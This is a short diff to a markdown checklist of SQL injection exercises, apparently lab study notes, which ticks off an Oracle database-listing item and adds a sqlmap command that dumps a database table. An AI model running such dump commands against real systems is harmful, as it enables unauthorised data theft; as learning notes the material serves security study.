@@ -53,7 +53,11 @@
     -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column```
     
     
-- [ ] SQL injection attack, listing the database contents on Oracle
+- [X] SQL injection attack, listing the database contents on Oracle
+
+    ```
+    sqlmap -u URL -D DB -T TABLE --dump
+    ```
 
 - [ ] Blind SQL injection with conditional responses
 
